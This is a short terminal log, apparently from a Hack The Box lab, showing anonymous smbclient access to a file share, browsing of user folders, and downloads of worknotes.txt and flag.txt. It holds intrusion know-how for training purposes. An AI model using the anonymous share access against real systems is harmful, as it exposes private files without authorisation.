# HACK-THE-BOCX-MACHINE-smbclient //10.129.95.55/WorkShares -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 11:22:01 2021
  ..                                  D        0  Mon Mar 29 11:22:01 2021
  Amy.J                               D        0  Mon Mar 29 12:08:24 2021
  James.P                             D        0  Thu Jun  3 11:38:03 2021

		5114111 blocks of size 4096. 1753956 blocks available
smb: \> get flag.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \flag.txt
smb: \> cd  Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 12:08:24 2021
  ..                                  D        0  Mon Mar 29 12:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 14:00:37 2021

		5114111 blocks of size 4096. 1753795 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> get .
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \Amy.J\.
smb: \Amy.J\> cd ..
smb: \> cd james.P
smb: \james.P\> ls
  .                                   D        0  Thu Jun  3 11:38:03 2021
  ..                                  D        0  Thu Jun  3 11:38:03 2021
  flag.txt                            A       32  Mon Mar 29 12:26:57 2021

		5114111 blocks of size 4096. 1753747 blocks available
smb: \james.P\> get flag.txt
getting file \james.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \james.P\> 

